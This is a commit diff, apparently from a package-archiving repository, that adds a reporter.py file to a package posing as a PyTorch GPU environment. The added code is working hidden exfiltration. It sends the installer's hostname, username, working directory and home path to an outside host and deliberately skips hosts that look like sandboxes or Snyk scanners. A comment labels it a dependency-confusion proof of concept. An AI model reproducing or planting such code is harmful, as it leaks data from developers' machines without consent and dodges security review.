2ccd11de375b17099f75ab7f1dac84cecc54d600
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 15:59:50 +0000

    Add package dlenv-pytorch-1-12-gpu/1.0.0/dlenv-pytorch-1-12-gpu-1.0.0.tar.gz

---
+++ packages/dlenv-pytorch-1-12-gpu/dlenv-pytorch-1-12-gpu-1.0.0.tar.gz/dlenv-pytorch-1-12-gpu-1.0.0/reporter.py
@@ -0,0 +1,24 @@
+import os
+import socket
+import getpass
+import re
+
+# This is PoC to detect dep confusion. Sends hostname, username, cwd and home dir name, nothing sensitive.
+
+def s(p):
+  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+    s.connect(("glinux-welcome.strangled.net", 80))
+    s.sendall(f"GET /{p} HTTP/1.1\r\nUser-Agent: dlenv-pytorch-1-12-gpu-1.0.0\r\nHost: dlenv-pytorch-1-12-gpu.strangled.net\r\n\r\n".encode("utf-8"))
+
+
+srv_host = socket.gethostname()
+username = getpass.getuser()
+
+if (username != "root" or not srv_host.startswith("ip-172-")) and "snyk" not in username and "snyk" not in srv_host and re.match(r"^DESKTOP-[A-Z0-9]{4,10}$", srv_host) is None and (username != "root" or re.match(r"^[a-f0-9]{11,13}$", srv_host) is None):
+  s(f"a-{srv_host}")
+  s(f"b-{username}")
+  cwd = os.getcwd()
+  s(f"c-{cwd}")
+  homedir = os.path.expanduser("~")
+  s(f"d-{homedir}")
+
